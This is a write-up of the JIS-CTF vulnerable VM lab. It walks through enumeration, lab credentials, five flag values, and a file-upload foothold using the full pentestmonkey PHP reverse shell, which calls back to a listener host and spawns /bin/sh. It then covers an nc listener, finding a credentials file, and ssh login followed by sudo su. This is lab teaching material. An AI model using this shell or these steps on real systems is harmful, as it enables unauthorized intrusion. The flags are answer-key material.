# JIS-CTF Walkthrough

Netdiscover result:

![image](https://github.com/keerthiprabup/VM/blob/main/JIS-CTF/picgit/1.png)

Nmap result:

![image](https://github.com/keerthiprabup/VM/assets/116485904/c96de9ea-ecfa-4947-b8d4-6ff2ffa99a53)

Browse the ip, try for robots.txt
![image](https://github.com/keerthiprabup/VM/assets/116485904/1e572a56-80f4-4439-b7ae-6acce58cc274)

The first flag inside the /flag dir

### The 1st flag is : {8734509128730458630012095}

We got the second flag and some creds from the /admin_area/ dir

![image](https://github.com/keerthiprabup/VM/assets/116485904/cea8bf2e-8c61-4660-8107-8031df2e8b0a)

creds 

	username : admin
	password : 3v1l_H@ck3r

### The 2nd flag is : {7412574125871236547895214}


Using the creds we can get loggedin in the login page

    http://192.168.42.62/login.php
    
We got an index page where we can upload files

![image](https://github.com/keerthiprabup/VM/assets/116485904/9d2394aa-a7e4-4c6c-928c-add53a72faa9)


I'm uploading a php reversing script on the page

script:

		<?php
		// php-reverse-shell - A Reverse Shell implementation in PHP
		// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
		//
		// This tool may be used for legal purposes only.  Users take full responsibility
		// for any actions performed using this tool.  The author accepts no liability
		// for damage caused by this tool.  If these terms are not acceptable to you, then
		// do not use this tool.
		//
		// In all other respects the GPL version 2 applies:
		//
		// This program is free software; you can redistribute it and/or modify
		// it under the terms of the GNU General Public License version 2 as
		// published by the Free Software Foundation.
		//
		// This program is distributed in the hope that it will be useful,
		// but WITHOUT ANY WARRANTY; without even the implied warranty of
		// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
		// GNU General Public License for more details.
		//
		// You should have received a copy of the GNU General Public License along
		// with this program; if not, write to the Free Software Foundation, Inc.,
		// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
		//
		// This tool may be used for legal purposes only.  Users take full responsibility
		// for any actions performed using this tool.  If these terms are not acceptable to
		// you, then do not use this tool.
		//
		// You are encouraged to send comments, improvements or suggestions to
		// me at pentestmonkey@pentestmonkey.net
		//
		// Description
		// -----------
		// This script will make an outbound TCP connection to a hardcoded IP and port.
		// The recipient will be given a shell running as the current user (apache normally).
		//
		// Limitations
		// -----------
		// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
		// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
		// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
		//
		// Usage
		// -----
		// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

		set_time_limit (0);
		$VERSION = "1.0";
		$ip = '192.168.42.12';  // CHANGE THIS
		$port = 1234;       // CHANGE THIS
		$chunk_size = 1400;
		$write_a = null;
		$error_a = null;
		$shell = 'uname -a; w; id; /bin/sh -i';
		$daemon = 0;
		$debug = 0;

		//
		// Daemonise ourself if possible to avoid zombies later
		//

		// pcntl_fork is hardly ever available, but will allow us to daemonise
		// our php process and avoid zombies.  Worth a try...
		if (function_exists('pcntl_fork')) {
		      // Fork and have the parent process exit
		      $pid = pcntl_fork();

		      if ($pid == -1) {
			    printit("ERROR: Can't fork");
			    exit(1);
		      }

		      if ($pid) {
			    exit(0);  // Parent exits
		      }

		      // Make the current process a session leader
		      // Will only succeed if we forked
		      if (posix_setsid() == -1) {
			    printit("Error: Can't setsid()");
			    exit(1);
		      }

		      $daemon = 1;
		} else {
		      printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
		}

		// Change to a safe directory
		chdir("/");

		// Remove any umask we inherited
		umask(0);

		//
		// Do the reverse shell...
		//

		// Open reverse connection
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) {
		      printit("$errstr ($errno)");
		      exit(1);
		}

		// Spawn shell process
		$descriptorspec = array(
		   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
		   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
		   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
		);

		$process = proc_open($shell, $descriptorspec, $pipes);

		if (!is_resource($process)) {
		      printit("ERROR: Can't spawn shell");
		      exit(1);
		}

		// Set everything to non-blocking
		// Reason: Occsionally reads will block, even though stream_select tells us they won't
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);

		printit("Successfully opened reverse shell to $ip:$port");

		while (1) {
		      // Check for end of TCP connection
		      if (feof($sock)) {
			    printit("ERROR: Shell connection terminated");
			    break;
		      }

		      // Check for end of STDOUT
		      if (feof($pipes[1])) {
			    printit("ERROR: Shell process terminated");
			    break;
		      }

		      // Wait until a command is end down $sock, or some
		      // command output is available on STDOUT or STDERR
		      $read_a = array($sock, $pipes[1], $pipes[2]);
		      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

		      // If we can read from the TCP socket, send
		      // data to process's STDIN
		      if (in_array($sock, $read_a)) {
			    if ($debug) printit("SOCK READ");
			    $input = fread($sock, $chunk_size);
			    if ($debug) printit("SOCK: $input");
			    fwrite($pipes[0], $input);
		      }

		      // If we can read from the process's STDOUT
		      // send data down tcp connection
		      if (in_array($pipes[1], $read_a)) {
			    if ($debug) printit("STDOUT READ");
			    $input = fread($pipes[1], $chunk_size);
			    if ($debug) printit("STDOUT: $input");
			    fwrite($sock, $input);
		      }

		      // If we can read from the process's STDERR
		      // send data down tcp connection
		      if (in_array($pipes[2], $read_a)) {
			    if ($debug) printit("STDERR READ");
			    $input = fread($pipes[2], $chunk_size);
			    if ($debug) printit("STDERR: $input");
			    fwrite($sock, $input);
		      }
		}

		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);

		// Like print, but does nothing if we've daemonised ourself
		// (I can't figure out how to redirect STDOUT like a proper daemon)
		function printit ($string) {
		      if (!$daemon) {
			    print "$string\n";
		      }
		}

		?> 

After uploading the file as phpreverseshell2.php (filename) in the page, Open a nc port listening on your terminal by mentioning the port number that is specifed in the script.

		$nc -nvlp 1234
Run the file using the link,

		http://192.168.42.62/http://192.168.42.62/uploaded_files/phpreverseshell2.php
		
		
We got a reverse shell in our terminal:

![image](https://github.com/keerthiprabup/VM/assets/116485904/c42e9567-c6af-4f32-b3fa-6e3d960d2d1d)

We have some files to check in the dir /var/www/html/

![image](https://github.com/keerthiprabup/VM/assets/116485904/cbb5a17f-bd0b-476d-bca2-0770d1f08ff7)

The file hint.txt has the next flag

![image](https://github.com/keerthiprabup/VM/assets/116485904/ad591b4f-2ee6-4ffb-a932-5655b3ea634e)

### The 3rd flag is : {7645110034526579012345670}

Using the command:
		
		$ find -type f -name *\.txt
We got a credentials file in the directory:

		./etc/mysql/conf.d/credentials.txt

![image](https://github.com/keerthiprabup/VM/assets/116485904/ffdd5bbb-5a9c-4053-a7ba-6f6e08ed286d)

### The 4th flag is : {7845658974123568974185412}

We got the password for technawi from here, now we can try logging in with ssh server using this credentials

command:

		$ssh technawi@192.168.42.62
		password: 3vilH@ksor
![image](https://github.com/keerthiprabup/VM/assets/116485904/7b30f750-8c7a-48f0-8d35-dedd87b07213)

technawi has sudo privilages so we can get root access with the command:

		$sudo su
The fifth flag is in the root directory of the webpage:

		/var/www/html

![image](https://github.com/keerthiprabup/VM/assets/116485904/255fce1e-b801-4e37-8ff9-9d2e9c90d855)

### The 5th flag is : {5473215946785213456975249}


